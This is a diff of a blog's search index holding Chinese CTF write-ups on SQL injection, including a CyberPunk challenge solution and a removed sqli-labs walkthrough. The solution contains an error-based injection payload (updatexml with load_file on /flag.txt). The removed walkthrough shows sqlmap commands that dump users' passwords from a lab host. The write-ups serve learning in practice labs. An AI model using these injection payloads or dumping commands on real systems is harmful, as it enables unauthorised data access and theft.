@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SQLI - 报错注入</title>
+    <url>/2020/01/04/sql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<html><head></head><body></body></html>]]></content>
+      <tags>
+        <tag>sqli</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk WriteUp</title>
     <url>/2019/12/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-WriteUp/</url>
     <content><![CDATA[<html><head></head><body><p>1. 启动了一台机器后发现这是一个买游戏CyberPunk的界面，一共有提交订单，查看订单，修改订单和删除订单这几个功能</p>
@@ -27,6 +35,20 @@
 <p>5. 思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下<strong>报错注入</strong>攻击语句</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">1' where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">'/flag.txt'</span>),<span class="number">1</span>,<span class="number">20</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//如果flag太长的话，通过改变<span class="keyword">substr</span>的起始值，就可以把flag剩下的部分查出来</span><br></pre></td></tr></tbody></table></figure></div>
 
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
 
 
 
@@ -54,34 +76,25 @@
 
 
 
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
 </body></html>]]></content>
       <tags>
         <tag>sqli</tag>
         <tag>writeup</tag>
         <tag>wechall</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF SQLi-LABS PAGE-1(Basic Challenges)</title>
-    <url>/2019/12/23/BUUCTF-SQLi-LABS-Page-1-Basic-Challenges/</url>
-    <content><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="这段时间在学sql注入，然后这篇BUUCTF-SQLi-LABS-PAGE-1-Basic-Challenges-写的是BUU上的sqli-labs中的通关总结，因为题比较多，加上期末考试，大概要一个月才能写完。╭-●｀∀´●-╯"><a href="#这段时间在学sql注入，然后这篇BUUCTF-SQLi-LABS-PAGE-1-Basic-Challenges-写的是BUU上的sqli-labs中的通关总结，因为题比较多，加上期末考试，大概要一个月才能写完。╭-●｀∀´●-╯" class="headerlink" title="这段时间在学sql注入，然后这篇BUUCTF SQLi-LABS PAGE-1(Basic Challenges)写的是BUU上的sqli-labs中的通关总结，因为题比较多，加上期末考试，大概要一个月才能写完。╭(●｀∀´●)╯"></a>这段时间在学sql注入，然后这篇BUUCTF SQLi-LABS PAGE-1(Basic Challenges)写的是BUU上的sqli-labs中的通关总结，因为题比较多，加上期末考试，大概要一个月才能写完。╭(●｀∀´●)╯</h2><p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.2/img/sqli-lab.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.2/img/sqli-lab.png" class="lazyload"></a></p>
-<h1 id="0x01-Less-1"><a href="#0x01-Less-1" class="headerlink" title="0x01 Less-1"></a>0x01 Less-1</h1><h3 id="先用sqlmap跑一下，发现存在注入"><a href="#先用sqlmap跑一下，发现存在注入" class="headerlink" title="先用sqlmap跑一下，发现存在注入"></a>先用sqlmap跑一下，发现存在注入</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python27 sqlmap.py -u <span class="string">"http://06d76e6b-3238-4cff-8b70-89b79eb9403b.node3.buuoj.cn/Less-1/?id=1"</span></span><br></pre></td></tr></tbody></table></figure></div>
-
-<h3 id="看一下数据库有哪些"><a href="#看一下数据库有哪些" class="headerlink" title="看一下数据库有哪些"></a>看一下数据库有哪些</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python27 sqlmap.py -u <span class="string">"http://06d76e6b-3238-4cff-8b70-89b79eb9403b.node3.buuoj.cn/Less-1/?id=1"</span> --dbs</span><br></pre></td></tr></tbody></table></figure></div>
-
-<h3 id="查当前库"><a href="#查当前库" class="headerlink" title="查当前库"></a>查当前库</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python27 sqlmap.py -u <span class="string">"http://06d76e6b-3238-4cff-8b70-89b79eb9403b.node3.buuoj.cn/Less-1/?id=1"</span> --current-db</span><br></pre></td></tr></tbody></table></figure></div>
-
-<h3 id="已知库名security查所有表"><a href="#已知库名security查所有表" class="headerlink" title="已知库名security查所有表"></a>已知库名security查所有表</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python27 sqlmap.py -u <span class="string">"http://06d76e6b-3238-4cff-8b70-89b79eb9403b.node3.buuoj.cn/Less-1/?id=1"</span> -D security --tables</span><br></pre></td></tr></tbody></table></figure></div>
-
-<h3 id="查表users的所有列名"><a href="#查表users的所有列名" class="headerlink" title="查表users的所有列名"></a>查表users的所有列名</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python27 sqlmap.py -u <span class="string">"http://06d76e6b-3238-4cff-8b70-89b79eb9403b.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users --columns</span><br></pre></td></tr></tbody></table></figure></div>
-<h3 id="导出三个数据列中所有数据"><a href="#导出三个数据列中所有数据" class="headerlink" title="导出三个数据列中所有数据"></a>导出三个数据列中所有数据</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python27 sqlmap.py -u <span class="string">"http://06d76e6b-3238-4cff-8b70-89b79eb9403b.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users -C id,password,username --dump</span><br></pre></td></tr></tbody></table></figure></div>
-
-<h1 id="0x02-Less-2"><a href="#0x02-Less-2" class="headerlink" title="0x02 Less-2"></a>0x02 Less-2</h1><h3 id="需要在url上加一个index-php，剩下的完全可以用less-1的流程来做，但是上面的流程完全可以简化"><a href="#需要在url上加一个index-php，剩下的完全可以用less-1的流程来做，但是上面的流程完全可以简化" class="headerlink" title="需要在url上加一个index.php，剩下的完全可以用less-1的流程来做，但是上面的流程完全可以简化"></a>需要在url上加一个index.php，剩下的完全可以用less-1的流程来做，但是上面的流程完全可以简化</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python27 sqlmap.py -u <span class="string">"http://06d76e6b-3238-4cff-8b70-89b79eb9403b.node3.buuoj.cn/Less-1/?id=1"</span>  -D security -T users --dump <span class="comment">#直接导出users的所有字段</span></span><br></pre></td></tr></tbody></table></figure></div>
-<h3 id="然而还可以更简单粗爆"><a href="#然而还可以更简单粗爆" class="headerlink" title="然而还可以更简单粗爆"></a>然而还可以更简单粗爆</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python27 sqlmap.py -u <span class="string">"http://06d76e6b-3238-4cff-8b70-89b79eb9403b.node3.buuoj.cn/Less-1/?id=1"</span> --dump <span class="comment">#直接导出当前库的所有表的所有字段</span></span><br></pre></td></tr></tbody></table></figure></div>
-<h1 id="0x03-Less-3"><a href="#0x03-Less-3" class="headerlink" title="0x03 Less-3"></a>0x03 Less-3</h1><h3 id="等等，这个sqli-labs是练习手工注入的吧！这三关都用sqlmap直接跑出来了……"><a href="#等等，这个sqli-labs是练习手工注入的吧！这三关都用sqlmap直接跑出来了……" class="headerlink" title="等等，这个sqli-labs是练习手工注入的吧！这三关都用sqlmap直接跑出来了……"></a>等等，这个sqli-labs是练习手工注入的吧！这三关都用sqlmap直接跑出来了……</h3><h3 id="手工注入走起╭-●｀∀´●-╯"><a href="#手工注入走起╭-●｀∀´●-╯" class="headerlink" title="手工注入走起╭(●｀∀´●)╯"></a>手工注入走起╭(●｀∀´●)╯</h3></body></html>]]></content>
-      <tags>
-        <tag>sqli</tag>
-        <tag>writeup</tag>
       </tags>
   </entry>
 </search>
